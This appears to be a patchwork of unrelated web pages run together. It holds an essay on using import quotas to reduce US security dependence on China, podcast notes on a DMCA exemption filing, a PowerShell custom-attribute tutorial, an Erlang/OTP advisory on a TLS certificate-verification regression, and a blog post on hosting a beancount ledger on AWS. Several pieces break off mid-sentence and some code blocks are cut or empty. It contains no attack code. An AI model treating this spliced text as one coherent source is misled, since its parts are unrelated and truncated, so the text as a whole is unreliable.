                    <p>America finds herself in a peculiar position. At the same time that she is in an increasingly tense geopolitical standoff with China, her economy remains deeply dependent on China for everything from pharmaceuticals to high-tech computing.</p><p>This disconnect between political and economic realms has led to increasing calls for “decoupling”: disentangling the economic ties between the US and China. Classical liberals and economists tend to instinctively recoil at such suggestions. Not only is the economic logic of free trade unassailable, they claim, but economic entanglement helps prevent war as well.</p><p>But as the prospect of US-China war becomes ever-less remote, it is worth taking seriously the security vulnerability that comes with America’s dependence on China. If war were to erupt, could China cut the US off from essential resources and goods, suffocating not only America’s economy but her war effort itself? The US’s inability to produce N95 masks during the pandemic—because <a href="https://palladiummag.com/2020/03/22/digital-salon-with-william-eden-and-matt-parlmer-coronavirus-response/">most of the world’s polypropylene</a> production is in China—provides just a taste of what this could be like.</p><p>A liberalism that clings too unreservedly to the ideals of free trade will be a liberalism unable to defend itself. The few percentage points of GDP we gain by offshoring production to China is dwarfed by the catastrophe that would be losing WWIII. And as demonstrated by Japan’s dependence on the US before WWII, economic dependence doesn’t even necessarily deter war—in fact, dependence could spur war.</p><p>But “decoupling” is no more than a buzzword. The US’s economic entanglement with China is decades in the making and would be impossible to unravel overnight. Nor is simply reducing the gross volume of imports the right goal. Rather, we should systematically address the specific security vulnerability our economic dependence on China creates. Should it come to war, America’s supply chains must be robust enough to do without Chinese imports—even if the war is long and general.</p><p>Addressing this security vulnerability would require long-run investments in the capabilities and physical factory capacity to produce many vital goods domestically. (Or in allied countries, but I will omit this caveat henceforth for simplicity.) The question is, how to incentivize this adjustment process?</p><p>Ideally, we could directly target the “security externality” of trade. But we run into a fundamental informational problem. In the complex web of modern supply chains, how do we know which imports create vulnerability? While for some imports this may be obvious, there might also be “Achilles’ heel” imports: random, $5 components that nobody thinks about, but that turn out to be essential, and for which the production expertise and facilities do not exist in the United States.</p><p>The “decouplers” seem to retreat to the canonical approach to trade restriction: tariffs. The problem with tariffs, however, is that they are royally ineffective at reducing the security vulnerability we are concerned about. A general tariff incentivizes onshoring the production that is cheapest and easiest to onshore—but it is likely the imports for which onshoring would be the most expensive and difficult that present the greatest security vulnerability, as I will explain. In the language of economics, I argue that the imports that present the greatest security vulnerability are those with the most inelastic import demand—while a general tariff most reduces those imports with the most elastic import demand.</p><p>I propose an alternative approach: general per-product quotas. These would better target vulnerability than a general tariff. Perhaps even more importantly, this mechanism would reveal critical information about which imports are associated with the greatest vulnerability. Using this information, the government could then directly tax this vulnerability or subsidize domestic production alternatives. In that sense, the per-product quotas could function as a “stress test” of the robustness of American supply chains to disruptions in the flow of Chinese imports.</p><p>Note that even if you disagree with the premise that we ought to “decouple,” I invite you to consider this economic question. Whether you like it or not, decoupling may become the political mandate—and so, as economists, we ought to figure out how to best execute on that political mandate (rather than hiding behind the dogma “but free trade is good!”).</p><h2 id="conceptualizing-the-security-vulnerability">Conceptualizing the Security Vulnerability</h2><p>Suppose the imports of a certain good were completely cut off. How bad would that be? That is what I shall term the “vulnerability” associated with importing that good.</p><p>Vulnerability depends on two factors:</p><ul><li>1) How essential the good is, and</li><li>2) How difficult replacing the import with domestic production would be.</li></ul><p>If suddenly our supply of nonessential goods—say, random gizmos like Rubik’s cubes—were cut off, that would be a bummer. But losing access to Rubik’s cubes would not be of greater relevance for the US economy or a potential war effort. By contrast, a critical component in microchip production would be more essential, for example.</p><p>Some imports may be essential, but the imports may be easily substituted by domestic production if necessary. For these goods, we might as well harvest the cost savings of offshoring during peacetime, and if necessary we could switch to emergency domestic production.</p><p>The imports we really should be worried about on security vulnerability grounds are those that are both essential <em>and</em> difficult to replace with domestic production. These might be imports like rare earths. If our rare earth supply were cut off, that could arrest our ability to procure new computer systems—and it would likely also be expensive, time-consuming, and difficult to establish alternative domestic production.</p><p>Critically, the degree of vulnerability associated with an import—whether it is nonessential or essential, whether it easily substituted by domestic production or not—is not reflected in its price. The dollar volume of rare earth imports from China is a fraction of the dollar volume of toy imports from China, for example. So we cannot measure the success of “decoupling” by simply looking the dollar volume of trade.</p><h2 id="the-security-vulnerability-in-economic-terms">The Security Vulnerability in Economic Terms</h2><p>We can put our conception of vulnerability in the language of economics by thinking about elasticities. In particular, vulnerability will correspond to inelastic import demand.</p><p>Consider first the two component factors of vulnerability mentioned above.</p><p><strong>Essentiality: Elasticity of General Demand </strong></p><p>The first factor, the essentiality of a good, corresponds to the elasticity of <em>general demand</em> (i.e. demand for the good regardless of source, whether foreign or domestic). The more inelastic general demand, the more buyers are willing to pay to continue procuring the good, so the more essential it is. If a good is nonessential, the more elastic general demand will be, as buyers would just forgo using that good altogether if the price got too high.</p><p><strong>Substitutability with Domestic Production: Elasticity of Domestic Supply</strong></p><p>The second factor, the difficulty of replacing the import with domestic production, corresponds to the elasticity of <em>domestic supply</em> of that good. The more elastic domestic supply, the easier and cheaper it would be to purchase more of this good domestically. Whereas inelastic domestic supply corresponds to it being expensive and difficult to procure this good domestically.</p><p>To be sure, some imports may be expensive to onshore (i.e. have inelastic domestic supply) simply because of labor costs, not because the US doesn’t have the capacity to make these goods in an emergency. But with respect to China, the view that offshoring is primarily about labor costs is outdated. As Steve Jobs <a href="https://www.nytimes.com/2012/01/22/business/apple-america-and-a-squeezed-middle-class.html">once told</a> Obama, iPhones are made in China not because of labor costs but because only China has the requisite manufacturing expertise and the vast industrial scale.</p><p><strong>Vulnerability: Elasticity of Import Demand</strong></p><p>It turns out that the combination of these factors—i.e., vulnerability itself—is captured by the elasticity of <em>import demand</em> for the good (i.e., the demand for the good solely from foreign, not domestic, sources). <em>The more inelastic the import demand for a good, the higher the vulnerability associated with importing that good.</em></p><p>To see this, note that the elasticity of import demand captures both the elasticities of general demand and domestic supply. The elasticity of <em>import demand</em> will depend on the elasticity of <em>general demand</em>; if general demand is very elastic, then, straightforwardly, import demand will be very elastic too.</p><p>Critically, the elasticity of <em>import demand</em> will also depend on the elasticity of <em>domestic supply</em>. If domestic supply is very elastic, import demand will be very elastic as well, since buyers would just switch to acquiring the good domestically if the import got too expensive. Whereas if domestic supply is inelastic, there is little alternative to continuing to import the good, so import demand will be inelastic as well.</p><p>Thus, the import demand will be inelastic exactly when vulnerability is high—when the good is both essential (inelastic general demand) and the import is not easily substituted by domestic production (inelastic domestic supply).</p><p>Thus, to reduce the security vulnerability, we want to onshore those goods where the import demand is inelastic, while we care much less about those goods where the import demand is more elastic. Considering this elasticity helps clarify the effect of trade interventions.</p><h2 id="tariffs">Tariffs</h2><p>A tariff most reduces purchases for goods with elastic import demand—while barely touching the quantity of purchases of goods with inelastic import demand. A general tariff on imports from China (~what the Trump Administration did) thus most reduces the imports that present the <em>least</em> security vulnerability, while barely touching the imports that present the greatest security vulnerability.</p><p>To put it in …</p></div></section></article></div></div></div>

   Software Freedom Conservancy filed multiple exemptions in the USA
   Copyright Office Triennial Rulemaking Process under the Digital Millennium
   Copyright Act (DMCA).  In this episode, Karen and Bradley explore the
   details of Conservancy's filing to request permission to circumvent
   technological restriction measures in order to investigate infringement of
   other people's copyright, which is a necessary part of investigations of
   alleged violations of the GPL and other copyleft licenses.

   </ul>

   <h4>Segment 1 (04:22)</h4>

   <ul>
   <li>Everyone in the Free Software community wishes the USA's Digital
   Millennium Copyright Act  didn't exist. (05:24)</li>
   <li>Bradley is currently doing research going to the year 1790 that shows
   the foundations of the copyright act, but Karen points out that Bradley
   isn't a professional copyright historian (yet). He points out he
   <em>is</em> an amateur copyright historian (05:45)</li>
   <li>DMCA is the USA's implementation of the WIPO Copyright Treaty (WCT),
   but is more a restrictive copyright act than the WCT requires. (06:50)
   </li>
   <li>Bradley mentioned that the three videos from the Copyright Office,
   <a href="https://sfconservancy.org/blog/2020/dec/16/dmca-exemptions-explained/">which
   are linked to from Conservancy's blog post on the subject</a> that, while
   they <em>are</em> Copyright Office propaganda, that are   helpful to explain the

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>The awesome thing about <strong>PowerShell</strong> is that you can be both user <em>and</em> author: it comes with all capabilities to <em>build</em> anything that you typically <em>consume</em>. That’s why <strong>PowerShell</strong> is an enourmously useful didactic tool, too. Today I’ll look at <em>creating</em> attributes that I <em>consumed</em> in previous parts.</p>
<p>Let’s start with a quick overview that focuses on the basics of creating and using custom attributes.</p>
<h2 id="creating-new-custom-attributes">Creating New Custom Attributes</h2>
<p>A <strong>PowerShell</strong> attribute is a class that derives from the type <strong>[System.Attribute]</strong>, so it takes only a few lines of code to add new custom attributes. Just remember that the name of your class <em>should</em> end with <em>Attribute</em> (although that is no requirement).</p>
<blockquote>
<p>Note also that <strong>PowerShell</strong> classes were added in <strong>PowerShell</strong> 5. If you are using an older version, make sure you update it (which you should for a multitude of reasons anyway) or if you can’t do that, <a href="https://powershell.one/powershell/core/install">install</a> <strong>PowerShell</strong> 7 side-by-side.</p>
</blockquote>
<div><div><pre><code><span>#requires -Version 5.0</span><span>

</span><span># custom attributes derive from the type "Attribute":</span><span>
</span><span>class</span><span> </span><span>PesterTestAttribute</span><span> </span><span>:</span><span> </span><span>Attribute</span><span> 
</span><span>{</span><span>
    </span><span># field to store constructor argument:</span><span>
    </span><span>[</span><span>string</span><span>]</span><span>$TestName</span><span> </span><span>=</span><span> </span><span>''</span><span>

    </span><span># field becomes an optional named argument later:</span><span>
    </span><span>[</span><span>int</span><span>]</span><span>$Level</span><span> </span><span>=</span><span> </span><span>0</span><span>
    
    </span><span># field becomes an optional named argument later:</span><span>
    </span><span>[</span><span>bool</span><span>]</span><span>$IsParam</span><span> </span><span>=</span><span> </span><span>$false</span><span>
    

    </span><span># constructor with one argument, </span><span>
    </span><span># this argument becomes a mandatory positional argument later:</span><span>
    </span><span>PesterTestAttribute</span><span>([</span><span>string</span><span>]</span><span>$TestName</span><span>)</span><span>
    </span><span>{</span><span>
        </span><span>$this</span><span>.</span><span>TestName</span><span> </span><span>=</span><span> </span><span>$TestName</span><span>
    </span><span>}</span><span>
    
    </span><span># constructor with NO argument,</span><span>
    </span><span># turns the positional mandatory argument into a positional optional argument later:</span><span>
    </span><span>PesterTestAttribute</span><span>()</span><span> </span><span>{}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>
<p>When you run this, you end up with a new attribute <strong>[PesterTest()]</strong>. The suffix <em>Attribute</em> in our class name <em>PesterTest<strong>Attribute</strong></em> is always ignored. Before we look at what you can <em>do</em> with it, let’s first focus on its anatomy:</p>
<ul>
<li><strong>Mandatory Positional Arguments:</strong> Attributes can have mandatory arguments. They are always positional. They are implemented as class constructor arguments. Our example class uses one positional argument that is internally stored in <code>$TestName</code>. Here is a use case: <strong>[PesterTest(‘Subject’)]</strong>.</li>
<li><strong>Optional Positional Arguments:</strong> If you want a positional argument to be <em>optional</em> instead of <em>mandatory</em>, add another parameterless constructor, or in the case of multiple parameters, one that omits the parameter that you want to keep <em>optional</em>. That’s why the example code adds a second parameterless constructor. Here is a use case: <strong>[PesterTest()]</strong>.</li>
<li><strong>Optional Named Arguments:</strong> Attributes can also have named arguments in the form of <em>key=value</em>. These are always optional and implemented as properties. The example code uses two optional arguments called <strong>Level</strong>, implemented as property <code>$Level</code>, and <strong>IsParam</strong>, implemented as property <code>$IsParam</code>. Here are use cases: <strong>[PesterTest(Level=12)]</strong>,<strong>[PesterTest(IsParam)]</strong>, <strong>[PesterTest(Level=4,IsParam)]</strong>, <strong>[PesterTest(‘LogToFile’,Level=6)]</strong>.</li>
</ul>
<p>You can <em>combine</em> arguments using comma separated lists, and you can apply attributes <em>multiple times</em> to the same structure, as you’ll see in a second.</p>
<h2 id="applying-custom-attributes">Applying Custom Attributes</h2>
<p>You can’t use attributes on its own (because it wouldn’t make any sense), but you can attach them to all kinds of things, for example to variables, parameters, classes or functions.</p>
<blockquote>
<p>That’s not completely true: actually, an attribute <em>defines</em> what the targets are that it can be attached to. If you don’t define targets, <strong>PowerShell</strong> allows you to attach the attribute to anything (that potentially accepts attributes).</p>
</blockquote>
<h3 id="no-arguments">No Arguments</h3>
<p>This is how you would attach the attribute to a variable. In this example, the attribute does not use <em>any</em> arguments:</p>

<h3 id="positional-arguments">Positional Arguments</h3>
<p>You can attach attributes to scriptblocks as well. Attributes must come first in scriptblocks, and scriptblocks <em>must</em> use a <strong>param()</strong> statement.</p>
<blockquote>
<p>Attributes were introduced in <strong>PowerShell</strong> 2 as part of <em>Advanced Functions</em>, so they work only in <em>Advanced Functions</em>, not in <em>Simple Functions</em>. The requirements for an <em>Advanced Function</em> are:</p>
<ol>
<li>uses at least one attribute (which we do anyway since we are applying a custom attribute) <strong>and</strong></li>
<li>uses a <strong>param()</strong> structure, even if it is empty.</li>
</ol>
<p>If you are <em>omitting</em> a <strong>param()</strong> structure, <strong>PowerShell</strong> creates a <em>Simple Function</em> and surfaces arguments in automatic variables such as <code>$args</code> and <code>$input</code>. Attributes are illegal in such scriptblocks and cause syntax errors.</p>
<p>Note that this requirement is true for scriptblocks in general, so you can use attributes in plain scriptblocks as well as long as you also add a <strong>param()</strong> statement.</p>
</blockquote>
<p>In this example, the attribute uses a positional parameter. Our positional parameter was of type <strong>[string]</strong> so any text will do:</p>
<div><div><pre><code><span>function</span><span> </span><span>Test-This</span><span>
</span><span>{</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'Parameterblock'</span><span>)]</span><span>
  </span><span>param</span><span>
  </span><span>(</span><span>
    </span><span>[</span><span>string</span><span>]</span><span>
    </span><span>$Name</span><span>
  </span><span>)</span><span>

</span><span>}</span><span>
</span></code></pre></div></div>
<h3 id="named-arguments">Named Arguments</h3>
<p>You can attach the attribute to parameters as well (which are just variables). In this example, the attribute uses a <em>positional</em> and two <em>named</em> arguments.</p>
<p>The <em>named</em> arguments are defined by the property name of our attribute class:</p>
<ul>
<li>
<p>The property <strong>Level</strong> is defined as <strong>[int]</strong>, so it must be a number.</p>
</li>
<li>
<p>The property <strong>IsParam</strong> is defined as <strong>[bool]</strong> so it must be <code>$true</code> or <code>$false</code>.</p>
<blockquote>
<p>Beginning in <strong>PowerShell</strong> 3, named attribute parameters of type <strong>[bool]</strong> do not need to have a value. If you omit the value, the attribute is set to <code>$true</code>. So in the example below, <code>IsParam</code> and <code>IsParam=$true</code> have the identical effect.</p>
</blockquote>
</li>
</ul>
<div><div><pre><code><span>function</span><span> </span><span>Test-This</span><span>
</span><span>{</span><span>
  </span><span>param</span><span>
  </span><span>(</span><span>
    </span><span>[</span><span>PesterTest</span><span>(</span><span>'Variable'</span><span>,</span><span> </span><span>Level</span><span>=</span><span>6</span><span>,</span><span> </span><span>IsParam</span><span>)]</span><span>
    </span><span>[</span><span>string</span><span>]</span><span>
    </span><span>$Name</span><span>
  </span><span>)</span><span>


</span><span>}</span><span>
</span></code></pre></div></div>
<h2 id="reading-custom-attributes">Reading Custom Attributes</h2>
<p>Attaching custom attribute to a number of things is simple, yet it won’t do anything. You simply attached information (“metadata”) to code. Attributes start to become useful when someone actually is <em>reading</em> the metadata.</p>
<p>Those who <em>define</em> attributes must typically also take care of <em>reading</em> the attributes. <strong>PowerShell</strong> defined a number of attributes such as <strong>[Parameter()]</strong>, <strong>[Hidden()]</strong>, or <strong>[ValidateSet()]</strong>, and these attributes are ready-to-use because <strong>PowerShell</strong> actively recognizes them and reads their content.</p>
<p>Your custom attributes are gracefully ignored by <strong>PowerShell</strong>. In order for them to do something exciting, <em>you</em> must actively search for them and read their content.</p>
<p>I called the custom attribute <strong>[PesterTest()]</strong> to tickle your inspiration: it <em>could</em> be used with <em>Pester</em> unit testing to attach metadata to your code. This metadata could be used to skip certain tests, request log levels, or even ask to send emails to someone in case a test failed. That however won’t happen for free. You would have to identify and read the <strong>[PesterTest()]</strong> attributes yourself within your <em>Pester</em> test code and respond accordingly.</p>
<blockquote>
<p>Fortunately, it is also possible to create custom attributes that derive from predefined <strong>PowerShell</strong> attributes. I’ll be looking at this <a href="#deriving-custom-attributes">later</a>. These attributes are automatically recognized and read by <strong>PowerShell</strong>, so they immediately start to <em>do</em> something.</p>
</blockquote>
<p>To check out how custom attributes can be identified and read, run this sample function first where I attached our new custom object to a number of code structures:</p>
<div><div><pre><code><span>function</span><span> </span><span>Test-Attribute</span><span>
</span><span>{</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'ReturnValue'</span><span>)]</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'Log'</span><span>,</span><span>Level</span><span>=</span><span>1</span><span>)]</span><span>
  </span><span>param</span><span>
  </span><span>(</span><span>
    </span><span>[</span><span>PesterTest</span><span>(</span><span>'Name'</span><span>,</span><span> </span><span>IsParam</span><span>)]</span><span>
    </span><span>[</span><span>string</span><span>]</span><span>
    </span><span>$Name</span><span>
  </span><span>)</span><span>

  </span><span>[</span><span>PesterTest</span><span>()]</span><span>$init</span><span> </span><span>=</span><span> </span><span>100</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>
<h3 id="reading-scriptblock-attributes">Reading ScriptBlock Attributes</h3>
<p>Each scriptblock has a property <strong>Attribute</strong> that surfaces all attached attributes:</p>
<div><div><pre><code><span>$scriptblock</span><span> </span><span>=</span><span> </span><span>{</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'ReturnValue'</span><span>)]</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'Log'</span><span>)]</span><span>
  </span><span>param</span><span>()</span><span>
  </span><span>'Hello!'</span><span>
</span><span>}</span><span>

</span><span>$scriptblock</span><span>.</span><span>Attributes</span><span>
</span></code></pre></div></div>
<p>All attached attributes are returned:</p>
<div><div><pre><code>TestName    Level IsParam TypeId             
--------    ----- ------- ------             
ReturnValue     0   False PesterTestAttribute
Log             1   False PesterTestAttribute
</code></pre></div></div>
<blockquote>
<p><strong>WARNING:</strong> You are not the only one that can attach attributes to scriptblocks, so you should make sure you are reading only the attributes you are looking for:</p>
<div><div><pre><code><span># read a specific attribute type:</span><span>
</span><span>$scriptblock</span><span>.</span><span>Attributes</span><span>.</span><span>Where</span><span>{</span><span>$_</span><span>.</span><span>TypeId</span><span>.</span><span>Name</span><span> </span><span>-eq</span><span> </span><span>'PesterTestAttribute'</span><span> </span><span>}</span><span>
</span></code></pre></div> </div>
</blockquote>
<h3 id="reading-function-attributes">Reading Function Attributes</h3>
<p>A <strong>PowerShell</strong> function is a scriptblock with a name, so use <code>Get-Command</code> to get to the scriptblock:</p>
<div><div><pre><code><span># read attributes attached to function "Test-Attribute"</span><span>
</span><span># define this function first (see above)</span><span>
</span><span>(</span><span>Get-Command</span><span> </span><span>-Name</span><span> </span><span>Test-Attribute</span><span>)</span><span>.</span><span>ScriptBlock</span><span>.</span><span>Attributes</span><span>
</span></code></pre></div></div>
<div><div><pre><code>TestName    Level IsParam TypeId             
--------    ----- ------- ------             
ReturnValue     0   False PesterTestAttribute
Log             1   False PesterTestAttribute
</code></pre></div></div>
<h3 id="reading-parameter-attributes">Reading Parameter Attributes</h3>
<p>Use <code>Get-Command</code> to get a <em>CommandInfo</em> object. It exposes all parameters in its property <strong>Parameters</strong> which is a hashtable. Parameter use attributes all the time so it is crucial to filter the attributes and select the one(s) you want to read:</p>
<div><div><pre><code><span>(</span><span>Get-Command</span><span> </span><span>-Name</span><span> </span><span>Test-Attribute</span><span>)</span><span>.</span><span>Parameters</span><span>[</span><span>"Name"</span><span>]</span><span>.</span><span>Attributes</span><span>.</span><span>Where</span><span>{</span><span>$_</span><span>.</span><span>TypeId</span><span>.</span><span>Name</span><span> </span><span>-eq</span><span> </span><span>'PesterTestAttribute'</span><span> </span><span>}</span><span>
</span></code></pre></div></div>
<div><div><pre><code>TestName Level IsParam TypeId             
-------- ----- ------- ------             
Name         0    True PesterTestAttribute
</code></pre></div></div>
<blockquote>
<p>If you attach attributes to parameters in a <em>anonymous</em> scriptblock that has no <em>CommandInfo</em> structure, you can read attributes only via the <strong>PowerShell</strong> <em>Ast</em>:</p>
<div><div><pre><code><span>$scriptblock</span><span> </span><span>=</span><span> </span><span>{</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'ReturnValue'</span><span>)]</span><span>
  </span><span>[</span><span>PesterTest</span><span>(</span><span>'Log'</span><span>,</span><span>Level</span><span>=</span><span>3</span><span>,</span><span>IsParam</span><span>)]</span><span>
  </span><span>param</span><span>()</span><span>
  </span><span>'Hello!'</span><span>
</span><span>}</span><span>

</span><span>$scriptBlock</span><span>.</span><span>Ast</span><span>.</span><span>ParamBlock</span><span>.</span><span>Attributes</span><span> </span><span>|</span><span> </span><span>Select-Object</span><span> </span><span>-Property</span><span> </span><span>TypeName</span><span>,</span><span> </span><span>PositionalArguments</span><span>,</span><span> </span><span>NamedArguments</span><span>
</span></code></pre></div> </div>
<p>The result is a static analysis performed by the <strong>PowerShell</strong> parser:</p>
<div><div><pre><code>TypeName   PositionalArguments NamedArguments  
--------   ------------------- --------------  
PesterTest {'ReturnValue'}     {}

</code></pre></div> </div>
</blockquote>
<h3 id="reading-variable-attributes">Reading Variable Attributes</h3>
<p>To access attributes attached to variables, use <code>Get-Variable</code>:</p>
<div><div><pre><code><span># apply attribute to variable:</span><span>

<h2>Certificate verification vulnerability in Erlang/OTP 23.2</h2>
  <p><small>Posted <span data-seconds-ago="249944">
    2021-01-15 12:06:59.472819</span></small></p>

<p>The ssl application version 10.2, part of Erlang/OTP 23.2 and 23.2.1, has a regression in the certificate verification logic. This could result in <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MitM attacks</a> on clients, as well as unauthorized access to servers that rely on client certificates.</p>
<p>The vulnerability is tracked as <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-35733">CVE-2020-35733</a>. A fix is available as part of ssl-10.2.1, in <a href="https://erlang.org/pipermail/erlang-questions/2021-January/100357.html">Erlang/OTP 23.2.2</a>. I will post further details in a follow-up post once everyone has had a chance to upgrade.</p>
<p>The purpose of this post is to help you understand how the issue may affect you. The short version: if you are using an affected version of Erlang/OTP, on development machines, build servers and/or deployment targets, you should probably upgrade as soon as possible.</p>
<h2>FAQ</h2>
<h3>1. Is my application affected?</h3>
<p>Certificate verification is primarily used by clients to detect attempts to intercept network traffic or impersonate servers. If your application includes any network clients that use TLS, it is almost certainly affected. Please refer to question 2 for details.</p>
<p>Some servers rely on client certificates to authenticate clients, and they too can be affected. Please refer to question 3 for more information.</p>
<h3>2. Are the clients in my application affected?</h3>
<p>If the application is running Erlang/OTP 23.2 and it connects to servers using TLS, the answer is almost certainly yes. Some clients <a href="https://blog.voltone.net/post/23">do not enable certificate verification</a>, but then such clients would have been susceptible to MitM attacks all along, regardless of Erlang/OTP version.</p>
<p>Some examples of affected clients include:</p>
<ul>
<li>HTTP clients, including the built-in <code>httpc</code>, as well as 3rd party clients such as Hackney, HTTPoison, Tesla and Mint; the fact that many of these clients use a custom ‘verify_fun’ (e.g. <a href="https://hex.pm/packages/ssl_verify_fun">ssl_verify_fun</a>) does not change that
</li>
<li>SMTP (mail) clients
</li>
<li>MQTT and RabitMQ clients
</li>
<li>Redis clients
</li>
<li>API clients that build on any of the above, e.g. to access AWS, Google APIs, Stripe, Sentry, etc.
</li>
</ul>
<p>Clients that build on the SSH protocol, such as SFTP, are not affected.</p>
<h3>3. Is my (web) server at risk?</h3>
<p>TLS servers, such as web servers, generally do not perform certificate verification, unless explicitly configured to request a certificate from clients (“mutual TLS”). Therefore in practice most servers are not affected.</p>
<p>Servers that delegate the TLS termination to a reverse proxy (e.g. Nginx) or load balancer (e.g. HAProxy) are not affected, even if they do require client certificates.</p>
<p>However, if your server…</p>
<ul>
<li>Relies on client certificates (“mutual TLS”); <em>and</em>
</li>
<li>Uses Erlang/OTP’s built-in ssl application, rather than external TLS termination; <em>and</em>
</li>
<li>Is running Erlang/OTP 23.2 or 23.2.1
</li>
</ul>
<p>…then malicious users may be able to produce fake client certificates that will be accepted by the server. If that is the case, deploy the fix as soon as possible.</p>
<h3>4. Is my development/build environment affected?</h3>
<p>Possibly. Fetching packages from Hex should be safe, because the Hex client verifies the signature on downloaded packages. But API interactions with the Hex server could be intercepted, which would leak your API credentials. An attacker could then publish malicious modifications to your packages, leading to code execution vulnerabilities for the users of those packages. Do not publish Hex packages until after you have upgraded.</p>
<p>If you are using a tool such as <code>kerl</code> or <code>asdf</code>, uninstall Erlang/OTP 23.2 and 23.2.1, and install 23.2.2 as soon as possible.</p>

<p><em>In <a href="https://duarteocarmo.com/blog/hacking-on-my-finances.html">part 1</a> of this series, I talked about the setup that I'm using to manage my finances and investments. In this part, I'll talk about how I migrated my accounting setup to the Cloud, and what I have learned in the process.</em></p>
<h2 id="the-goal-accessing-my-finances-from-anywhere">The goal: Accessing my finances from anywhere</h2>
<p>Currently, I <a href="https://duarteocarmo.com/blog/hacking-on-my-finances.html">manage my finances using beancount</a>, a Python based plain-text accouting <a href="https://beancount.github.io/">library</a>. It allows me to create a personal ledger (aka, the <code>beancount</code> file), and then visualize my assets and expenses using <a href="https://beancount.github.io/fava/">Fava</a> - a web interface/explorer for it. </p>
<p>Although it works great in my machine, I envisioned something a bit more streamlined where:</p>
<ul>
<li>I update the ledger file locally</li>
<li>I commit the changed file to a private repository</li>
<li>The <code>beancount</code> file is validated ("bean-check runs without problems")</li>
<li>I can access the fava web interface from anywhere</li>
<li>The web interface is protected (I don't want <em>everyone</em> analyzing my finances)</li>
<li>Everytime I commit a new beancount file, the fava web interface should update</li>
</ul>
<p>My goal was to automate this sequence of events, and to take maximum advantage of Cloud technologies during that process.</p>
<p>To do it, I used a combination of <a href="https://beancount.github.io/fava/">Fava</a>, <a href="https://www.docker.com/">Docker</a>, <a href="https://docs.github.com/en/free-pro-team@latest/actions/quickstart">GitHub Actions</a>, <a href="https://aws.amazon.com/elasticbeanstalk/">AWS Elastic Beanstalk</a>, and <a href="https://www.cloudflare.com/">Cloudflare</a>. </p>
<p>Here's a <a href="https://github.com/duarteocarmo/hacking-on-my-finances">sanitized version of the repo</a> containing all the necessary files. </p>
<p>And a simplified view of the architecture (using <a href="https://excalidraw.com/">excalidraw</a>):</p>

<img src="https://duarteocarmo.com/images/beancount-beanstalk.png" alt="Fava example">
</center>
<h2 id="step-1-using-docker-to-containerize-the-application">Step 1: Using Docker to containerize the application</h2>
<p>For the deployment, I'm using two Docker containers: </p>
<ul>
<li>A <a href="https://hub.docker.com/r/yegle/fava/">containerized version of the Fava web interface</a> that takes a <code>beancount</code> file as input and exposes the web interface</li>
<li>A <a href="https://github.com/beevelop/docker-nginx-basic-auth">docker image</a> that provides an NGINX proxy with user-password authentication</li>
</ul>
<p>To test it in my local machine, I created a <code>docker-compose.yml</code> file with both containers:</p>
<pre><code>version: "3.7"

services:
  fava:
    image: yegle/fava
    volumes:
      - "./:/bean"
    environment:
      # assuming you have a filename.beancount in the current directory 
      BEANCOUNT_FILE: /bean/filename.beancount
  auth:
    image: beevelop/nginx-basic-auth
    links:
      - fava:fava
    ports:
      - 8000:80 # yourmachineIP:containerIP
    environment:
      FORWARD_PORT: 5000
      FORWARD_HOST: fava
      # Use this link to generate your credentials: https://hostingcanada.org/htpasswd-generator/
      HTPASSWD: "foo:$apr1$odHl5EJN$KbxMfo86Qdve2FH4owePn."
</code></pre>
<p>Once that's set up, I can run <code>docker-compose up</code>, and the application will be running in <code>http://localhost:8000</code>.</p>
<p>Now let's talk hosting.</p>
<h2 id="step-2-beancount-on-beanstalk">Step 2: Beancount on Beanstalk</h2>
<p><em>Disclaimer: I'm not a Security expert - and cannot assure this setup is 100% private and secure. Can anyone though?</em></p>
<p>I spent some time browsing for the best options to deploy a <code>docker-compose.yml</code> file, and decided to go with AWS Elastic Beanstalk. Mostly because of <a href="https://www.youtube.com/watch?v=nhqcecpi47s">this awesome video</a>, and <a href="https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/create_deploy_docker_ecstutorial.html">some great documentation from AWS</a>.</p>
<p>You'll notice that instead of a <code>docker-compose.yml</code> file, AWS requests a <code>dockerrun.aws.json</code> file, they are very similar actually. It's just Amazon's way of keeping you locked into their service. Sad. </p>

         ]
      }
   ]

</code></pre>
</details>
<p>Next step is to bundle the both the <code>filename.beancount</code> and the <code>dockerrun.aws.json</code> files into a single <code>.zip</code> file, which can be uploaded to AWS Beanstalk directly. </p>
<p>And that's it, that's what is needed to run an authenticated version of fava in the web. Once uploaded, AWS provides a direct link to my protected fava instance.</p>
<p>But hold up, there's still a couple of things to automate. </p>
<h2 id="step-3-using-github-actions-to-automate-the-deployment">Step 3: Using GitHub actions to automate the deployment</h2>
<p>Logging into to my AWS console and uploading a new <code>zip</code> everytime I change my <code>beancount</code> file is a pain. And I don't like pain. </p>
<p>To avoid this, I created a github action that automatically watches the repo containing my <code>beancount</code> file and watches for changes in that file. If it changes, it then validates the ledger file, creates a new <code>.zip</code> version of the application, and uploads that to my AWS Beanstalk instance. </p>
<p>It uses <a href="https://github.com/einaregilsson/beanstalk-deploy">this</a> action as a base and adds a couple of features to it, like the validation of the ledger file for example. </p>
<details>
<summary>Click here to expand the GitHub action</summary>
<pre><code>name: Deploy master

</details>
<p>Once all of this is running in a private repo, everytime I commit a change to my <code>.beancount</code> file, my Beanstalk application gets updated! (It's not instant, but its fast enough!)</p>
<h2 id="step-4-securing-everything-with-cloudflare">Step 4: Securing everything with Cloudflare</h2>
<p><a href="https://www.cloudflare.com/">Cloudflare</a> is my go to tool to manage networking for all my applications. It gives me:</p>
<ul>
<li>DNS management (setting domain names)</li>
<li>HTTPS encryption</li>
<li>Website authentication and protection</li>
<li>Firewall management</li>
</ul>
<p>In a single place. Pretty insane.</p>
<p>Will not go in depth about all of the setup details here, but I can really recomment using Cloudflare. Awsome tool. </p>
<h2 id="final-notes">Final notes</h2>
